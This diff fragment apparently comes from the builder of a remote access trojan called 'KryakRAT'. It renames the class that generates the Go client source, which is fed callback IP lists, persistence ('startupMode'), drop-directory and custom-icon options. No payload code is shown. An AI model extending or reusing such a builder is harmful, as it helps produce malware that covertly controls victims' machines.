@@ -381,9 +381,9 @@ namespace KryakRAT.Pages
             string tempModPath = Path.Combine(tempBuildDir, "go.mod");
             string tempSumPath = Path.Combine(tempBuildDir, "go.sum");
             File.Delete(Path.Combine(tempBuildDir, "rsrc.syso"));
-            File.WriteAllText(tempGoPath, ClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint, startupMode, dropDirectory));
-            File.WriteAllText(tempModPath, ClientSourceCode.GetModCode());
-            File.WriteAllText(tempSumPath, ClientSourceCode.GetSumCode());
+            File.WriteAllText(tempGoPath, WindowsClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint, startupMode, dropDirectory));
+            File.WriteAllText(tempModPath, WindowsClientSourceCode.GetModCode());
+            File.WriteAllText(tempSumPath, WindowsClientSourceCode.GetSumCode());
 
             if (CustomIconCheckBox.IsChecked == true)
             {
